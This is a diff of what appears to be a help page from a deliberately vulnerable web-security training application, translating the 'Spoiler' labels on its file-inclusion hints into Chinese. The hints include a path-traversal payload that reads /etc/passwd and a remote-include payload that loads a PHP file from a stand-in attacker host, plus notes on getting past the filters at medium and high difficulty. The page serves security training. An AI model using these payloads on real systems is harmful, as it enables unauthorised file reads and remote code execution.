@@ -28,23 +28,23 @@
 		<p>This allows for direct input into <u>one of many PHP functions</u> that will include the content when executing.</p>
 
 		<p>Depending on the web service configuration will depend if RFI is a possibility.</p>
-		<pre>Spoiler: <span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
-			Spoiler: <span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>
+		<pre>剧透：<span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
+			剧透：<span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>
 
 		<br />
 
 		<h3>中级别</h3>
 		<p>The developer has read up on some of the issues with LFI/RFI, and decided to filter the input. However, the patterns that are used, isn't enough.</p>
-		<pre>Spoiler: <span class="spoiler">LFI: Possible, due to it only cycling through the pattern matching once</span>.
-			Spoiler: <span class="spoiler">RFI: <?php echo dvwaExternalLinkUrlGet( 'https://secure.php.net/manual/en/wrappers.php', 'PHP Streams' ); ?></span>.</pre>
+		<pre>剧透：<span class="spoiler">LFI: Possible, due to it only cycling through the pattern matching once</span>.
+			剧透：<span class="spoiler">RFI: <?php echo dvwaExternalLinkUrlGet( 'https://secure.php.net/manual/en/wrappers.php', 'PHP Streams' ); ?></span>.</pre>
 
 		<br />
 
 		<h3>高级别</h3>
 		<p>The developer has had enough. They decided to only allow certain files to be used. However as there are multiple files with the same basename,
 			they use a wildcard to include them all.</p>
-		<pre>Spoiler: <span class="spoiler">LFI: The filename only has start with a certain value.</span>.
-			Spoiler: <span class="spoiler">RFI: Need to link in another vulnerability, such as file upload</span>.</pre>
+		<pre>剧透：<span class="spoiler">LFI: The filename only has start with a certain value.</span>.
+			剧透：<span class="spoiler">RFI: Need to link in another vulnerability, such as file upload</span>.</pre>
 
 		<br />
 
